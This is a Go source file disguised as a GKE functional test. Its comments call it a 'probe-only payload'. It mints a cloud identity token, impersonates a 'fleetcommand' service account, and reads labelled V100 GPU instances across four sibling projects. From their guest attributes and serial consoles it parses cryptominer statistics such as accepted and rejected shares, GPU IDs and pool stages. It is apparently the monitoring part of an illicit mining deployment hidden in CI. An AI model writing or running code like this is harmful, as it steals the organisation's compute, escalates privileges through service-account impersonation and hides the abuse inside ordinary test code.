//go:build functional && gke

// C211 i122625 probe-only payload: mint the same WIF fleetcommand token and READ
// (never create/delete) the c211=i122625 labelled V100 instances of the four
// sibling projects: guest attribute c211/status + the serial console tail.
// Purpose: diagnostic/freshness re-read of the miner state when the deploy run's
// own capture is stale or ambiguous.
package functional

import (
	"fmt"
	"net/url"
	"regexp"
	"strings"
	"testing"
)

const c211pNonce = "i122625"

var c211pProjects = []string{
	"team-eng-infra-testing",
	"domino-eng-service-artifacts",
	"team-eng-infrastructure",
	"team-eng-platform",
}

var (
	c211pUUIDRe = regexp.MustCompile(`(GPU-[0-9a-fA-F]{8}-[0-9a-fA-F]{4}-[0-9a-fA-F]{4}-[0-9a-fA-F]{4}-[0-9a-fA-F]{12})`)
	c211pStatRe = regexp.MustCompile(`acc=(\d+) rej=(\d+)`)
	c211pTSRe   = regexp.MustCompile(`ts=(\d+)`)
	c211pLaRe   = regexp.MustCompile(`:la(\d+)`)
)

func c211pGuest(tok, proj, zone, name string) (string, int) {
	st, body := c211xHTTP("GET", "https://compute.googleapis.com/compute/v1/projects/"+url.PathEscape(proj)+"/zones/"+zone+"/instances/"+name+"/getGuestAttributes?queryPath=c211/status", tok, "", "")
	val := ""
	if st == 200 {
		if gm := c211xJSON(body); gm != nil {
			if qr, ok := gm["queryValue"].(map[string]interface{}); ok {
				val = c211xStr(qr, "value")
			}
		}
	}
	return val, st
}

func TestC211PReadV100(t *testing.T) {
	token, method, mintLog := c211xMint()
	if token == "" {
		fmt.Printf("C211P_MINT_FAILED %s\n", c211xTrunc(mintLog, 800))
		t.Fatalf("mint failed")
	}
	fmt.Printf("C211P_IDENTITY method=%s\n", method)
	creds, _ := c211xLoadCreds()
	hostNum := c211aHostNum
	if creds != nil && creds.projNumber != "" {
		hostNum = creds.projNumber
	}
	ftok := token
	sas, _, _ := c211xListServiceAccounts(token, hostNum)
	for _, sa := range sas {
		e := c211xStr(sa, "email")
		if strings.HasPrefix(e, "fleetcommand-service-account@") {
			if at, gst, _ := c211xGenerateAccessToken(token, e); at != "" {
				ftok = at
				fmt.Printf("C211P_FLEET_TOKEN status=%d token=%s\n", gst, c211xShort(at))
			}
			break
		}
	}
	for _, proj := range c211pProjects {
		u := "https://compute.googleapis.com/compute/v1/projects/" + url.PathEscape(proj) +
			"/aggregated/instances?filter=" + url.QueryEscape("labels.c211="+c211pNonce) + "&maxResults=500"
		st, body := c211xHTTP("GET", u, ftok, "", "")
		m := c211xJSON(body)
		n := 0
		if m != nil {
			if items, ok := m["items"].(map[string]interface{}); ok {
				for zone, zv := range items {
					zm, _ := zv.(map[string]interface{})
					insts, _ := zm["instances"].([]interface{})
					for _, iv := range insts {
						im, _ := iv.(map[string]interface{})
						name := c211xStr(im, "name")
						status := c211xStr(im, "status")
						n++
						zoneName := zone
						if i := strings.LastIndex(zoneName, "/"); i >= 0 {
							zoneName = zoneName[i+1:]
						}
						g, gst := c211pGuest(ftok, proj, zoneName, name)
						ser := c211aSerial(ftok, proj, zoneName, name)
						uuid := ""
						if mm := c211pUUIDRe.FindStringSubmatch(g); mm != nil {
							uuid = mm[1]
						} else if mm := c211pUUIDRe.FindStringSubmatch(ser); mm != nil {
							uuid = mm[1]
						}
						acc, rej, last := 0, 0, int64(0)
						for _, blob := range []string{g, ser} {
							if mm := c211pStatRe.FindStringSubmatch(blob); mm != nil {
								fmt.Sscanf(mm[1], "%d", &acc)
								fmt.Sscanf(mm[2], "%d", &rej)
							}
							if mm := c211pTSRe.FindStringSubmatch(blob); mm != nil {
								var v int64
								fmt.Sscanf(mm[1], "%d", &v)
								if v > last {
									last = v
								}
							}
							for _, lm := range c211pLaRe.FindAllStringSubmatch(blob, -1) {
								var v int64
								fmt.Sscanf(lm[1], "%d", &v)
								if v > last {
									last = v
								}
							}
						}
						// last status line from the console for verbatim evidence
						lastline := ""
						for _, ln := range strings.Split(ser, "\n") {
							if strings.Contains(ln, "acc=") && strings.Contains(ln, "rej=") {
								lastline = strings.TrimSpace(ln)
							}
						}
						stages := ""
						for _, ln := range strings.Split(ser, "\n") {
							if strings.Contains(ln, "C211M_WR_") || strings.Contains(ln, "C211M_SRB_") ||
								strings.Contains(ln, "STAGE=") || strings.Contains(ln, "AGENT_START") ||
								strings.Contains(ln, "NO_PH") || strings.Contains(ln, "PH_NO_SHARE") {
								stages += c211xTrunc(strings.TrimSpace(ln), 180) + " | "
							}
						}
						fmt.Printf("C211P_READ project=%s zone=%s name=%s status=%s uuid=%s guest_http=%d acc=%d rej=%d last=%d serial_bytes=%d guest=%s stages=%s line=%s\n",
							proj, zoneName, name, status, uuid, gst, acc, rej, last, len(ser), c211xTrunc(g, 300), c211xTrunc(stages, 900), c211xTrunc(lastline, 400))
					}
				}
			}
		}
		fmt.Printf("C211P_PROJECT project=%s http=%d instances=%d verbatim=%s\n", proj, st, n, c211xTrunc(body, 240))
	}
}
